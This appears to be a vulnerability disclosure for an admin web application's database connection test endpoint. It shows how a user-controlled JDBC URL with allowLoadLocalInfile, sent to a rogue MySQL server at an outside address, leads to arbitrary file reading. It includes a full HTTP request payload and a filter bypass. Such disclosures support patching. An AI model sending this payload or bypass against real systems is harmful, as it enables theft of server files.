# 1. Basic Vulnerability Information

**Affected URL**:  http://localhost:8013/api/database/testConnect

**Affected Parameters:**  jdbcUrl

**Impact Scope:**  ALL

**Vulnerability description：**  Controllable MySQL parameters cause arbitrary file reading


# 2. Reproduction Steps
Start the MySQL malicious server first
![image](https://github.com/user-attachments/assets/a20ee820-c3f4-4d56-a3d1-7dcd3007a114)
Complete request packet,

``` html
POST /api/database/testConnect HTTP/1.1
Host: localhost:8013
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Origin: http://localhost:8013
sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
Content-Type: application/json
Accept: application/json, text/plain, */*
Sec-Fetch-Site: same-origin
Cookie: ELADMIN-TOEKN=Bearer%20eyJhbGciOiJIUzUxMiJ9.eyJ1aWQiOiJiNzcxOTc3YmI2ZTA0NGY0ODIxNWU5ZDI5YTFmODY4NyIsInVzZXJJZCI6MSwic3ViIjoiYWRtaW4ifQ.vvy9yXOpJzkWKz4G3K5UQ79kImSxcfgNcOK83z-uN_hvQpxBfMPGRLhKfdILZyt0ZJk-75-IKGGSzf2lWIcTmA; sidebarStatus=0
sec-ch-ua-mobile: ?0
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Mode: cors
Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1aWQiOiJiNzcxOTc3YmI2ZTA0NGY0ODIxNWU5ZDI5YTFmODY4NyIsInVzZXJJZCI6MSwic3ViIjoiYWRtaW4ifQ.vvy9yXOpJzkWKz4G3K5UQ79kImSxcfgNcOK83z-uN_hvQpxBfMPGRLhKfdILZyt0ZJk-75-IKGGSzf2lWIcTmA
Referer: http://localhost:8013/mnt/maint/database
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 272

{"id":"fc1d430a8b4c42f2818bdba1378eac9b","name":"11","jdbcUrl":"jdbc:mysql://192.168.3.34:3305/test?allowLoadLocalInfile = true","userName":"111222","pwd":"111222","createBy":"admin","createTime":"2025-04-05 14:43:25","updateBy":"admin","updateTime":"2025-04-05 14:43:25"}
```



# 3. Vulnerable Code
![image](https://github.com/user-attachments/assets/efbcb745-444c-48dc-b7bb-6e9e8017ac81)

Keep following up until here


![image](https://github.com/user-attachments/assets/e73db303-1776-47fb-93f9-104c11390d84)


There is security filtering,

![image](https://github.com/user-attachments/assets/6fca8e6c-8a6c-482b-a1d8-ce0e29ed4e44)

But regular matching is too strict and can be bypassed

`AllowLoadLocalInfinite=true    //will not be matched`
![image](https://github.com/user-attachments/assets/449952dd-1805-4859-97e0-226b34ec47f6)

Establishing a TCP link triggers a vulnerability,

![image](https://github.com/user-attachments/assets/4c4fc94b-6157-4860-ace5-246656efa239)



# 4. Remediation Suggestions
Improve filtration


